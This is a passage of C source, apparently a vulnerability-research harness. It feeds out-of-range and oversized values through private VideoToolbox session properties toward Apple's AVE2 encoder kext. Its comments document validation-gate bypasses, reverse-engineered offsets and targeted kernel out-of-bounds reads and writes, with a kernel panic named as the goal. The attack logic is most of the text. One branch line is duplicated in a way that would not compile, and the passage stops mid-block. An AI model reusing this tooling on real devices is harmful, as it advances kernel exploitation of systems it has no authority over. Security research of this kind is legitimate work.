            const char *kk = ds_opt_ungt_key((int)(val & 0xFF));
            if (kk) {
                CFStringRef kks = CFStringCreateWithCString(kCFAllocatorDefault, kk, kCFStringEncodingUTF8);
                CFNumberRef nf = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &val2);
                CFDictionarySetValue(spec, kks, nf);
                CFRelease(kks);
                CFRelease(nf);
            }
        } else if (kind == DS_OPT_MCTF_ARM) {
            /* v78: the MCTF enable-arm packs the INTMAX edge count in the create
             * dict (the one-sided 'iEdgeCnt >= 0' gate - INTMAX passes) and the
             * post-create EnableMCTF=true arms the kernel MCTF path so the kext's
             * MCTF config parser (fields +0x408..+0x498) actually consumes it. */
            CFStringRef kks = CFStringCreateWithCString(kCFAllocatorDefault, "MCTFEdgeCount", kCFStringEncodingUTF8);
            CFNumberRef nf = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &val2);
            CFDictionarySetValue(spec, kks, nf);
            CFRelease(kks);
            CFRelease(nf);
        } else if (kind == DS_OPT_MCTF_PARAMS) {
            /* v79: the MCTFParams CFArray channel - the plugin's
             * AVE_Prop_HEVC_SetMCTFParams (registry: AVE_kVTCompressionPropertyKey_
             * MCTFParams / 'MCTFParams' - the BARE name is the forwardable one per
             * the v75 AVE/CLL census evidence) parses a FLAT CFArray of CFNumbers
             * with FIXED-index GetChar/GetSInt16/GetSInt32 calls (30 x
             * S_AVE_MCTF_Param @0x58B into session+0x8C8, flag +0x978) - ALL 30
             * attacker strength slots ride the marshal to the kext's array-indexed
             * MCTFStrengthLevel[%d] reads. val = value pattern (1 = 0x5a else
             * INTMAX), val2 = entry count cap (def 600 - covers the ~30x18 flat
             * shape). */
            long nEl = (val2 > 0 && val2 <= 1024) ? val2 : 600L;
            long pat = (val == 1) ? 0x5a : 0x7fffffff;
            CFMutableArrayRef mArr = CFArrayCreateMutable(kCFAllocatorDefault, 0, &kCFTypeArrayCallBacks);
            if (mArr) {
                for (long ei = 0; ei < nEl; ei++) {
                    long ev = pat;
                    CFNumberRef en = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &ev);
                    CFArrayAppendValue(mArr, en);
                    CFRelease(en);
                }
                CFDictionarySetValue(spec, CFSTR("MCTFParams"), mArr);
                CFRelease(mArr);
            }
        } else if (kind == DS_OPT_MCTF_STR) {
            /* v79: MCTFStrengthLevel SPEC sweep - the plugin SETTER's two-sided
             * gate ('0 <= iMCTFStrengthLevel && iMCTFStrengthLevel < 25' -
             * AVE_Prop_AVC_SetMCTFStrengthLevel @0x1f79df) is on the setter only;
             * the create SPEC channel (v57 forward-verbatim) rides the raw value
             * to the kext's sign-bit-gated marshal read = INTMAX/25 = the
             * array-index OOB candidate. */
            CFStringRef kks = CFStringCreateWithCString(kCFAllocatorDefault, "MCTFStrengthLevel", kCFStringEncodingUTF8);
            CFNumberRef nf = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &val2);
            CFDictionarySetValue(spec, kks, nf);
            CFRelease(kks);
            CFRelease(nf);
        } else if (kind == DS_OPT_PPS_HEVC && (val2 & 0x8000)) {
            /* v93: STR25-SPEC value-sweep - the create-dict strength channel (v79
             * forward-verbatim; SetProperty is -12900 BLOCKED v91). Value = (val2>>24)&0xFF
             * (1..24 legal - both setters reject >=25 with 'out of range (%d, %d]'). The
             * values land at sess+0x8b4/0x8b8 = kext dump words 4-5 INSIDE the count-8 ride
             * window (0x8a4..0x8c0) = OUR words in the kernel dump for the FIRST time. */
            CFStringRef kks = CFStringCreateWithCString(kCFAllocatorDefault, "MCTFStrengthLevel", kCFStringEncodingUTF8);
            long sv = ((val2 >> 24) & 0xFF) ? ((val2 >> 24) & 0xFF) : 0x18;
            CFNumberRef nf = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &sv);
            CFDictionarySetValue(spec, kks, nf);
            CFRelease(kks);
            CFRelease(nf);
        } else if (kind == DS_OPT_PPS_HEVC && (val2 & 0x10000)) {
            /* v93: STR25-SPEC INTMAX - the gate-reject probe: AVC setter 2b94643a0 cmp #0x19
             * b.hs reject, HEVC setter 2b94df7a8 '0 < iNum && iNum <= 2' + 'out of range' -
             * INTMAX is REJECTED by both, so the daemon 'out of range' log line IS the proof
             * the gate runs on the create path (INTMAX never lands at 0x8b4). */
            CFStringRef kks2 = CFStringCreateWithCString(kCFAllocatorDefault, "MCTFStrengthLevel", kCFStringEncodingUTF8);
            long sv2 = 0x7fffffff;
            CFNumberRef nf2 = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &sv2);
            CFDictionarySetValue(spec, kks2, nf2);
            CFRelease(kks2);
            CFRelease(nf2);
        } else if (kind == DS_OPT_PPS_HEVC && (val2 & 0x40000)) {
            /* v93: MCTFParams create-dict - the NEVER-fired-without-EnableMCTF params channel
             * (AVE_Prop_HEVC_SetMCTFParams 2b94e00a4: AVE_MCTF_Retrieve parses the CFArray
             * into the 0xA0 struct -> 2 fixed 0x58 copies at sess+0x8c8/0x920). 32 CFNumbers =
             * the 2x16 retrieve shape (w26 = count/2). The daemon log 'MCTF Params: %d | 18
             * values' = the receipt; sess+0x8c8 = the kext 0x704a44 count-driven element-copy
             * region (0x8c8) = the kernel OOB-write candidate if the count rides the marshal. */
            CFMutableArrayRef mArr = CFArrayCreateMutable(kCFAllocatorDefault, 0, &kCFTypeArrayCallBacks);
            for (int mi = 1; mi <= 32; mi++) {
                long mv = mi;
                CFNumberRef en = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &mv);
                CFArrayAppendValue(mArr, en);
                CFRelease(en);
            }
            CFDictionarySetValue(spec, CFSTR("MCTFParams"), mArr);
            CFRelease(mArr);
        } else if (kind == DS_OPT_MCTF_FMT) {
        } else if (kind == DS_OPT_MCTF_FMT) {
            /* v80: the MCTF-FORMAT-FIX channel - the SAME MCTF config as v79
             * (params array / strength / edge count) but fired on input formats
             * that pass the AVE_ImgBuf_Verify gate (the v79 run PROVED the MCTF
             * config flips the session source format to 420v and the verify
             * rejects it pre-kernel = -17691 = the hostile MCTF values never
             * reached the kext). val & 0xF = format (1 = 2vuy + source hint,
             * 2 = 420v10, 3 = 420v8b planar), (val >> 8) & 0xFF = channel
             * (1 = MCTFParams array, 2 = MCTFStrengthLevel, 3 = MCTFEdgeCount),
             * val & 0x10 = the INTMAX pattern. */
            long mch = (val >> 8) & 0xFF;
            long mpat = (val & 0x10) ? 0x7fffffff : 0x5a;
            if (mch == 1) {
                long nEl = (val2 > 0 && val2 <= 1024) ? val2 : 600L;
                CFMutableArrayRef mArr = CFArrayCreateMutable(kCFAllocatorDefault, 0, &kCFTypeArrayCallBacks);
                if (mArr) {
                    for (long ei = 0; ei < nEl; ei++) {
                        long ev = mpat;
                        CFNumberRef en = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &ev);
                        CFArrayAppendValue(mArr, en);
                        CFRelease(en);
                    }
                    CFDictionarySetValue(spec, CFSTR("MCTFParams"), mArr);
                    CFRelease(mArr);
                }
            } else {
                const char *kk = (mch == 2) ? "MCTFStrengthLevel" : "MCTFEdgeCount";
                CFStringRef kks = CFStringCreateWithCString(kCFAllocatorDefault, kk, kCFStringEncodingUTF8);
                CFNumberRef nf = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &val2);
                CFDictionarySetValue(spec, kks, nf);
                CFRelease(kks);
                CFRelease(nf);
            }
            /* v82: CREATE-TIME VEPBA pin - the v81 post-create VTSessionSetProperty(
             * VideoEncoderPixelBufferAttributes) returned -12901 (read-only AFTER
             * create); the create-time SPEC dict is forwarded verbatim to the daemon
             * at VTCompressionSessionCreate, so the encoder-input format pin MUST
             * ride here. The v81 run PROVED NO-TX (AllowPixelTransfer=false) kills
             * the transfer chain - pinning the encoder-input format may ALSO change
             * what the MCTF-armed AVE_ImgBuf_Verify sees (the -17691 gate target). */
            {
                OSType vf2 = ds_opt_mctf_fmt(val & 0xF);
                CFMutableDictionaryRef vd2 = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
                if (vd2) {
                    CFNumberRef pf2 = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &vf2);
                    CFDictionarySetValue(vd2, kCVPixelBufferPixelFormatTypeKey, pf2);
                    CFRelease(pf2);
                    CFDictionarySetValue(spec, CFSTR("VideoEncoderPixelBufferAttributes"), vd2);
                    CFRelease(vd2);
                }
            }
        } else if (kind == DS_OPT_PPS_HEVC) {
            /* v86: the PPS_HEVC co-arm = the eRCMode-HwVal GATE-BYPASS via the
             * CREATE-time spec dict with the REAL REGISTERED KEYS (recovered this
             * session from slice .05's key table: 'LowLatencyEnabled RateControlMode
             * UsingHardwareEncoder ErrorCode AppState' + .15/.28's
             * 'CodecPropertyBitRateControlMode' with the daemon log 'Set
             * CodecPropertyBitRateControlMode to %d'). The force-to-1 gate
             * (AVE_ValidateEncoderParameters @2b947a484) skips when eRCMode == 0x14
             * (AVE_RCMode_HwVal): AVE_Prop_HEVC_SetRCMode (2b94cfd14) accepts 1..100
             * and writes sess+0x6d4 (the gate's read field). v85 VERDICT: QSMPreset=1
             * (Flat) does NOT flip scaling_list_enabled_flag - the custom-matrix
             * presets 2/3/5/7 are the flag-flippers. (val>>16) bits: 0x1/0x2/0x4/0x8
             * = QSM presets 2/3/5/7 post-create, 0x10 = 'RateControlMode'=20 (real),
             * 0x20 = 'CodecPropertyBitRateControlMode'=20 (daemon-forwarded),
             * 0x40 = 'LowLatencyEnabled'=1 (the RC-derivation steering key, real),
             * 0x80 = 'MultipassEnabled'=1. */
            long cob = (val >> 16) & 0x0C0;  /* v88: spec-RC bits 0x20/0x40/0x80 only - bit 0x10 = the CQP arm, 0x100/0x400 = usage */   /* v87: + 0x100/0x200/0x400 = EncoderUsage 1/20/37 (the eRCMode-HwVal lever) */
            if (cob & 0x10) {
                long rv = 20;
                CFNumberRef rf = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &rv);
                CFDictionarySetValue(spec, CFSTR("RateControlMode"), rf);
                CFRelease(rf);
            }
            if (cob & 0x20) {
                long rv2 = 20;
                CFNumberRef rf2 = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &rv2);
                CFDictionarySetValue(spec, CFSTR("CodecPropertyBitRateControlMode"), rf2);
                CFRelease(rf2);
            }
            if (cob & 0x40) {
                /* v86 reviewer fix: LowLatencyEnabled is a BOOLEAN spec key - the
                 * v71 finding proved boolean props need CFBoolean (CFNumber=1 was
                 * the -2003 wrong-type risk on the daemon side). */
                CFDictionarySetValue(spec, CFSTR("LowLatencyEnabled"), kCFBooleanTrue);
            }
            if (cob & 0x80) {
                /* v86 reviewer fix: MultipassEnabled is a BOOLEAN spec key. */
                CFDictionarySetValue(spec, CFSTR("MultipassEnabled"), kCFBooleanTrue);
            }
        }
    }
    /* v72: session-geometry pre-decode - the VAR cells can shrink the SESSION to the
     * input size (variant 9: no pixel-transfer chain is built = the blitter-required
     * test) or arm a scaling mode (variants 10/12 Trim, 11 Letterbox = chain-geometry
     * levers on the killer input). The v71 run PROVED the 420-family input kills the
     * daemon in the INPUT-SCALING blitter (vt_Copy_420v_Crop NULL-src-row memmove),
     * NOT in the AVE encode path. */
    int sessW = 1920, sessH = 1080;
    CFStringRef scaleMode = NULL;
    /* v98: the 4K DIMS lever (val2 & 0x20000000) - session 4096x2304 = 256x144 MBs
     * = the 147456B dims-derived map required (the plugin PrepareMBInputCtrl
     * size-gate 'required' scales with the session dims). 4.5x the 1080p MB table. */
    if (kind == DS_OPT_PPS_HEVC && (val2 & (0x20000000 | 0x20000))) { sessW = 4096; sessH = 2304; }
    if (kind == DS_OPT_USAGE_VAR) {
        int vf = (int)(val & 0xF);
        if (vf == 9) { sessW = 64; sessH = 64; }
        else if (vf == 10 || vf == 12) scaleMode = kVTScalingMode_Trim;
        else if (vf == 11) scaleMode = kVTScalingMode_Letterbox;
    }
    /* v74: the UNGAITED-field cells ride a HEVC session where the firmware MCTF path
     * is live (MCTF is a HEVC feature; the HDR payload props are HEVC-only). The AVC
     * cells + the churn stay on H264. */
    CMVideoCodecType codec = kCMVideoCodecType_H264;
    if (kind == DS_OPT_UNGT_DATA || kind == DS_OPT_HDR_TRIPLE || kind == DS_OPT_SEI_REFEED ||
        kind == DS_OPT_TB_GRIND ||    /* v78: the TB emitter grind - HEVC (the TB setter is HEVC+AV1) */
        (kind == DS_OPT_PPS_HEVC && !(val2 & 0x4000)) ||   /* v84: HEVC UPS cells ride HEVC; v91: the 0x4000 AVC-twin bit switches the SESSION to H264 so ChromaQPIndexOffsetMultiPPS dispatches to AVE_Prop_AVC_SetChromaQPIndexOffsetMultiPPS @2b943f804 */
        kind == DS_OPT_MCTF_PARAMS || kind == DS_OPT_MCTF_STR || kind == DS_OPT_MCTF_ARM || kind == DS_OPT_MCTF_FMT ||  /* v79: the MCTF channel + arm on HEVC - the v78 arm used AVC where MCTF is use-time-blocked ('FIG: MCTF for AVC is not supported yet!') = HEVC is the REAL MCTF path */
        (kind == DS_OPT_UNGT_SPEC && (val & 0xFF) >= 4) ||   /* v77: MV/RC/FG private fields ride the HEVC path */
        (kind == DS_OPT_UNGT_NUM && (val & 0x1000)))
        codec = kCMVideoCodecType_HEVC;
    __block VTCompressionSessionRef sess = NULL;
    CFDictionaryRef srcAttrs = NULL;   /* v80: the MCTF 420v-gate fix - pin the source format to 2vuy so the daemon does NOT convert the input to 420v (the v79 run: AVE_ImgBuf_Verify:444 'pixel format is not supported 875704438' = the MCTF config flips the session source format to 420v and the verify rejects it pre-kernel = -17691) */
    if (kind == DS_OPT_MCTF_FMT) {
        /* v81: pin the SOURCE format to the cell's input format (2vuy / x420 /
         * 420v). NOTE the v80 run PROVED the source hint does NOT stop the
         * transfer-output conversion (the daemon still produced 420v) - the v81
         * kill is the post-create AllowPixelTransfer=false (NO-TX) + the VEPBA
         * pin on the encoder-input side. */
        long mf0 = val & 0xF;
        OSType sf = ds_opt_mctf_fmt(mf0);   /* v82: the full DevCap table */
        CFMutableDictionaryRef sd = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        if (sd) {
            CFNumberRef pf = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &sf);
            CFDictionarySetValue(sd, kCVPixelBufferPixelFormatTypeKey, pf);
            CFRelease(pf);
            srcAttrs = sd;
        }
    }
    /* v104: the cell create is GUARDED - after the OPC0 sweep/refire wedges kill the
     * FigRPC connections, the next cell's create can SIGTRAP (the 22:46:48 queue-own
     * bug); caught here = the cell is skipped, the row survives. */
    __block OSStatus st = -999;
    int csSig0 = 0;
    csSig0 = ds_ave_guard_run_tmo(^int {
        OSStatus s = VTCompressionSessionCreate(NULL, sessW, sessH, codec,
                                                spec, srcAttrs, NULL, ave_out_cb, NULL, &sess);
        return (int)s;
    }, (int *)&st, 10000);
    if (csSig0 > 0) {
        /* v107: ANY create fault/timeout = the FigRPC conn is sick (00:19: the create
         * itself HUNG in mach_msg inside the guard; the watchdog turned it into SIGALRM
         * 14). Poison = every later cell is gated - never create on a dead conn. */
        g_opt_conn_poisoned = 1;
        if (csSig0 == SIGALRM)
            dprintf(STDOUT_FILENO, "%s  I[%s] session create TIMEOUT (v107 watchdog 10s - the FigRPC conn is dead; cell skipped, later cells gated)\n", pfx, tag);
        else
            dprintf(STDOUT_FILENO, "%s  I[%s] session create FAULTED sig=%d @0x%lx (v107: conn sick - cell skipped, later cells gated)\n",
                    pfx, tag, csSig0, (unsigned long)g_ave_fault_addr);
        /* bounded-leak note: sess is NOT released here on purpose - if the signal
         * landed after the session was partially assigned, releasing it post-longjmp
         * could itself fault (half-constructed session / double-free). The bounded
         * leak of one session is the safe outcome (matches the harness convention). */
        if (srcAttrs) CFRelease(srcAttrs);
        if (spec) CFRelease(spec);
        ds_journal_write("DONE", tag);
        return;
    }
    if (srcAttrs) CFRelease(srcAttrs);
    if (spec) CFRelease(spec);
    int scaleStat = -999;
    if (st == 0 && sess && scaleMode) {
        /* v73: the v72 Trim/Letterbox cells were NO-OPS - the direct
         * kVTPixelTransferPropertyKey_ScalingMode set returned -12900 (the key is not
         * in the session's SupportedPropertyDictionary - 'not in the
         * SupportedPropertyDictionary' per the daemon log). The census lists
         * 'PixelTransferProperties' [57] as the FORWARDABLE key - its value is a
         * CFDictionary of VTPixelTransferProperties (ScalingMode inside). This is the
         * proper iOS channel: scale=dict(0) = the lever ENGAGES (the chain-geometry
         * question becomes answerable); -12900 = the lever is unarmable via session
         * props on iOS = the geometry question closes by API limitation. */
        CFMutableDictionaryRef ptd = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        if (ptd) {
            CFDictionarySetValue(ptd, kVTPixelTransferPropertyKey_ScalingMode, scaleMode);
            scaleStat = (int)VTSessionSetProperty(sess, CFSTR("PixelTransferProperties"), ptd);
            CFRelease(ptd);
        }
    }
    if (st != 0 || !sess) {
        dprintf(STDOUT_FILENO, "%s  I[%s] session create=%d\n", pfx, tag, (int)st);
        ds_journal_write("DONE", tag);
        return;
    }
    /* session-property cells (DPBRequirements / UserDPBFrames) ride BEFORE the frame -
     * the v57 daemon log proved the pre-encode DPBRequirements set REACHES the AVE
     * plugin but dies at 'AVE_Prop_AVC_SetDPBRequirements:5574 psINS->pcVCP != __null'
     * (pcVCP is null before the first frame) -> -1015 -> -17691 - a DAEMON-side gate. */
    int propStat = 0;
    int propStat2 = 0;   /* v66: the RCQPRange pair's second set (SoftMax) status */
    if (kind == DS_OPT_DPB_REQ) {
        CFMutableDictionaryRef req = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        CFNumberRef nf = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &val);
        CFDictionarySetValue(req, CFSTR("num_frames"), nf);
        CFRelease(nf);
        /* kVTCompressionPropertyKey_DPBRequirements is PRIVATE (not in the SDK) - use
         * the literal; the daemon's FIG prints 'SetProperty ... DPBRequirements with
         * bad parameter num_frames = %d' when it reads it. */
        propStat = VTSessionSetProperty(sess, CFSTR("DPBRequirements"), req);
        CFRelease(req);
    } else if (kind == DS_OPT_USERDPB) {
        CFMutableArrayRef arr = CFArrayCreateMutable(kCFAllocatorDefault, 0, &kCFTypeArrayCallBacks);
        for (long i = 0; i < val2 && i < 32; i++) {   /* v57: bounded - no client balloon */
            long v = val;
            CFNumberRef nf = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &v);
            CFArrayAppendValue(arr, nf);
            CFRelease(nf);
        }
        propStat = VTSessionSetProperty(sess, CFSTR("UserDPBFrames"), arr);
        CFRelease(arr);
    } else if (kind == DS_OPT_AVE_PROP) {
        /* v61: the raw-key session-prop sweep against the KERNEL gate catalog - the
         * kernelcache strings ('%lld %d AVE %s: ... <Prop> %d') name the fields the
         * AppleAVE2 KEXT reads; the daemon's AVE_Prop_AVC_Set<Prop> dispatcher is the
         * marshal. 0 = getter ACCEPTED -> the hostile value packs into the kernel-bound
         * config struct -> the next encode hands it to the kext -> a kext gate with a
         * MISSING bounds check = PANIC = THE 64747 goal. */
        const char *kkey = ds_opt_ave_prop_key((int)val2);
        if (kkey) {
            CFNumberRef nf = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &val);
            CFStringRef keyS = CFStringCreateWithCString(kCFAllocatorDefault, kkey, kCFStringEncodingUTF8);
            propStat = VTSessionSetProperty(sess, keyS, nf);
            CFRelease(keyS);
            CFRelease(nf);
        }
    } else if (kind == DS_OPT_UNGT_NUM) {
        /* v74: the UNGAITED numeric marshal fields - the AVC MCTFEdgeCount setter
         * gate is 'iEdgeCnt >= 0' (ONE-SIDED: INTMAX passes the plugin and packs into
         * the VideoParamsDriver struct -> the S_AVE_UCInParam_Config marshal -> the
         * kext logs it ungated ('%p %lld MCTFEdgeCount %d') and the MCTF edge sizing
         * consumes it). 0 = delivered; the daemon log's AVE_Prop_AVC_Set<Field> line
         * + the encode receipt = the delivery proof. */
        const char *kkey = ds_opt_ungt_key((int)(val & 0xFF));
        if (kkey) {
            long vv = val2;
            CFNumberRef nf = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &vv);
            CFStringRef keyS = CFStringCreateWithCString(kCFAllocatorDefault, kkey, kCFStringEncodingUTF8);
            propStat = VTSessionSetProperty(sess, keyS, nf);
            CFRelease(keyS);
            CFRelease(nf);
        } else {
            propStat = -9999;   /* bad key index - never let it read as DELIVERED */
        }
    } else if (kind == DS_OPT_UNGT_DATA) {
        /* v74: the UNGAITED CFData marshal fields - HDR payloads the kext copies at
         * fixed dword widths (AmbientViewingEnvironment 8 dwords, ContentLightLevel-
         * Info 4 dwords). The plugin's 'invalid <Name> size' is the ONLY gate - a
         * length that passes it but overruns the fixed copy = the kernel OOB. */
        const char *kkey = ds_opt_ungt_key((int)(val & 0xFF));
        if (kkey) {
            long dlen = val2;
            CFDataRef dat = NULL;
            if (dlen > 0 && dlen <= (1 << 20)) {
                uint8_t *buf = (uint8_t *)malloc((size_t)dlen);
                if (buf) {
                    memset(buf, 0x5a, (size_t)dlen);
                    dat = CFDataCreate(kCFAllocatorDefault, buf, (CFIndex)dlen);
                    free(buf);
                }
            }
            if (dat) {
                CFStringRef keyS = CFStringCreateWithCString(kCFAllocatorDefault, kkey, kCFStringEncodingUTF8);
                propStat = VTSessionSetProperty(sess, keyS, dat);
                CFRelease(keyS);
                CFRelease(dat);
            } else {
                dprintf(STDOUT_FILENO, "%s  I[%s] UNGT CFData alloc failed (len=%ld) - cell void\n", pfx, tag, dlen);
                propStat = -9999;
            }
        } else {
            propStat = -9999;   /* bad key index - never let it read as DELIVERED */
        }
    } else if (kind == DS_OPT_UNGT_SPEC) {
        /* v75: no SetProperty - the hostile value rides the create-time SPEC dict
         * (built above, forwarded verbatim). propStat -9997 = the spec-channel
         * sentinel so the receipt never reads as a SetProperty DELIVERED. */
        propStat = -9997;
    } else if (kind == DS_OPT_TB_GRIND) {
        /* v78: TB-emitter GRIND - the (0,512] MAX-LEGAL CFData{512} rides the kext's
         * '%p %lld InsertTrailingBytes %d' Config marshal and val2 FRAMES push the
         * NAL emitter's per-frame 512-byte trailing copy repeatedly. */
        long vv = 512L;   /* the (0,512] ceiling - hardcoded: val2 = the FRAME count */
        CFDataRef dat = NULL;
        uint8_t *buf = (uint8_t *)malloc((size_t)vv);
        if (buf) {
            memset(buf, 0x5a, (size_t)vv);
            dat = CFDataCreate(kCFAllocatorDefault, buf, (CFIndex)vv);
            free(buf);
        }
        if (dat) {
            CFStringRef keyS = CFStringCreateWithCString(kCFAllocatorDefault, "InsertTrailingBytes", kCFStringEncodingUTF8);
            propStat = VTSessionSetProperty(sess, keyS, dat);
            CFRelease(keyS);
            CFRelease(dat);
        } else {
            propStat = -9999;
        }
    } else if (kind == DS_OPT_MCTF_ARM) {
        /* v78: MCTF ENABLE-ARM - EnableMCTF=true (census [39] IN-LIST, the plugin's
         * AVE_Prop_AVC_SetEnableMCTF) AFTER create: the kext's MCTF config parser
         * only runs when MCTF is live - the INTMAX MCTFEdgeCount (in the create
         * dict) then hits the kernel edge-sizing math. */
        propStat = VTSessionSetProperty(sess, CFSTR("EnableMCTF"), kCFBooleanTrue);
    } else if (kind == DS_OPT_MCTF_PARAMS || kind == DS_OPT_MCTF_STR || kind == DS_OPT_MCTF_FMT) {
        /* v79: post-create EnableMCTF=true arms the kernel MCTF path (HEVC codec
         * - the v78 arm used AVC where MCTF is use-time-blocked). The SPEC dict
         * built pre-create carries MCTFParams / MCTFStrengthLevel. v80: the
         * MCTF_FMT cells ride the same arm on the format-fixed sessions. */
        propStat = VTSessionSetProperty(sess, CFSTR("EnableMCTF"), kCFBooleanTrue);
        if (kind == DS_OPT_MCTF_PARAMS) ds_mctf_params_stat = (int)propStat;
        else if (kind == DS_OPT_MCTF_STR) ds_mctf_str_stat = (int)propStat;
        else if (kind == DS_OPT_MCTF_FMT) {
            if (((val >> 8) & 0xFF) == 1) ds_mctf_params_stat = (int)propStat;
            else ds_mctf_str_stat = (int)propStat;
            /* v81: the 420v-gate kill - VEPBA pins the encoder-input format and
             * AllowPixelTransfer=false (NO-TX) kills the conversion chain so the
             * buffer goes STRAIGHT to AVE_ImgBuf_Verify (the v80 run PROVED the
             * transfer converts the input to 420v which the MCTF-armed supported
             * list rejects, and OP08's x420 scale-transfer crashed the daemon).
             * Pinned mode (val & 0x20): VEPBA={x420} + the transfer ON = the
             * vt_CopyAvg_2vuy_x420 blitter (exists in the VT binary) converts
             * 2vuy->x420 at matched size - the fallback if the AllowPixelTransfer
             * lever is client-blocked (-12900). */
            long mf0 = val & 0xF;
            int pinned = (val & 0x20) ? 1 : 0;
            OSType vfmt = (pinned) ? kCVPixelFormatType_420YpCbCr10BiPlanarVideoRange : ds_opt_mctf_fmt(mf0);   /* v82: the full DevCap table */
            ds_mctf_vepba_stat = -9999;
            ds_mctf_notx_stat = -9999;
            CFMutableDictionaryRef vd = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            if (vd) {
                CFNumberRef pf = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &vfmt);
                CFDictionarySetValue(vd, kCVPixelBufferPixelFormatTypeKey, pf);
                CFRelease(pf);
                ds_mctf_vepba_stat = (int)VTSessionSetProperty(sess,
                    kVTCompressionPropertyKey_VideoEncoderPixelBufferAttributes, vd);
                CFRelease(vd);
            }
            if (!pinned)
                ds_mctf_notx_stat = (int)VTSessionSetProperty(sess,
                    ds_kAllowPixelTransfer, kCFBooleanFalse);
        }
    } else if (kind == DS_OPT_HDR_TRIPLE) {
        /* v76: the THREE exact-width legal HDR payloads on ONE HEVC session -
         * AVE CFData{8} + CLL CFData{4} + MDCV CFData{24} (each passes its daemon
         * exact-width validator - 'not 8 bytes'/'not 4 bytes'/'not 24 bytes'). All
         * three ride the S_AVE_UCInParam_Config marshal together into the kext's
         * fixed-width Data reads (AVE 8 / CLL 4 / MDCV 12+4+4+4 dwords). Receipt:
         * the three propStats - 0/0/0 = the full triple RIDES. */
        long tlens[3] = { 8, 4, 24 };
        int tkidx[3] = { 2, 3, 7 };
        for (int th = 0; th < 3; th++) {
            const char *tk = ds_opt_ungt_key(tkidx[th]);
            ds_hdr_trip[th] = -9999;
            if (!tk) continue;
            uint8_t *tbuf = (uint8_t *)malloc((size_t)tlens[th]);
            CFDataRef tdat = NULL;
            if (tbuf) {
                memset(tbuf, 0x5a, (size_t)tlens[th]);
                tdat = CFDataCreate(kCFAllocatorDefault, tbuf, (CFIndex)tlens[th]);
                free(tbuf);
            }
            if (!tdat) continue;
            CFStringRef tkeyS = CFStringCreateWithCString(kCFAllocatorDefault, tk, kCFStringEncodingUTF8);
            ds_hdr_trip[th] = (int)VTSessionSetProperty(sess, tkeyS, tdat);
            CFRelease(tkeyS);
            CFRelease(tdat);
        }
        propStat = (ds_hdr_trip[0] == 0 && ds_hdr_trip[1] == 0 && ds_hdr_trip[2] == 0) ? 0
                 : (ds_hdr_trip[0] != 0) ? ds_hdr_trip[0] : (ds_hdr_trip[1] != 0) ? ds_hdr_trip[1] : ds_hdr_trip[2];
    } else if (kind == DS_OPT_SEI_REFEED) {
        /* v77: SEI-REFEED - arm the FULL-output capture (the SELF-DECODE tail reads
         * g_ave_cap_sb) + pack the hostile HDR prop exactly like the UNGT_DATA cells:
         * val bit 0-7 = key idx (2 = AVE, 3 = CLL, 7 = MDCV), val2 = CFData length
         * (8/4/24 - the EXACT legal widths the v76 run DELIVERED). bit 8 (0x100) =
         * the AVE8+CLL4+MDCV24 TRIPLE. The v76 fp PROOF (5a5a5a5a in the encoded
         * output) = our SEI bytes ride the actual bitstream the decoder will parse. */
        g_ave_cap_on = 1;
        if (g_ave_cap_sb) { CFRelease(g_ave_cap_sb); g_ave_cap_sb = NULL; }  /* stale sample from a prior cell */
        if (val & 0x100) {
            long tlens[3] = { 8, 4, 24 };
            int tkidx[3] = { 2, 3, 7 };
            for (int th = 0; th < 3; th++) {
                const char *tk = ds_opt_ungt_key(tkidx[th]);
                ds_hdr_trip[th] = -9999;
                if (!tk) continue;
                uint8_t *tbuf = (uint8_t *)malloc((size_t)tlens[th]);
                CFDataRef tdat = NULL;
                if (tbuf) {
                    memset(tbuf, 0x5a, (size_t)tlens[th]);
                    tdat = CFDataCreate(kCFAllocatorDefault, tbuf, (CFIndex)tlens[th]);
                    free(tbuf);
                }
                if (!tdat) continue;
                CFStringRef tkeyS = CFStringCreateWithCString(kCFAllocatorDefault, tk, kCFStringEncodingUTF8);
                ds_hdr_trip[th] = (int)VTSessionSetProperty(sess, tkeyS, tdat);
                CFRelease(tkeyS);
                CFRelease(tdat);
            }
            if (val & 0x200) {
                /* v78: TB-COMPOUND - pack InsertTrailingBytes=CFData{512} on the SAME
                 * session as the HDR TRIPLE: the output NAL carries the hostile SEI
                 * AND 512 trailing bytes (the compound shape NEVER fired - v77 refed
                 * SEI-only samples; the decoder parse of SEI+trailing = NEW shape). */
                long tbLen = 512L;
                uint8_t *tbb = (uint8_t *)malloc((size_t)tbLen);
                CFDataRef tbd = NULL;
                if (tbb) {
                    memset(tbb, 0x5a, (size_t)tbLen);
                    tbd = CFDataCreate(kCFAllocatorDefault, tbb, (CFIndex)tbLen);
                    free(tbb);
                }
                if (tbd) {
                    CFStringRef tbk = CFStringCreateWithCString(kCFAllocatorDefault, "InsertTrailingBytes", kCFStringEncodingUTF8);
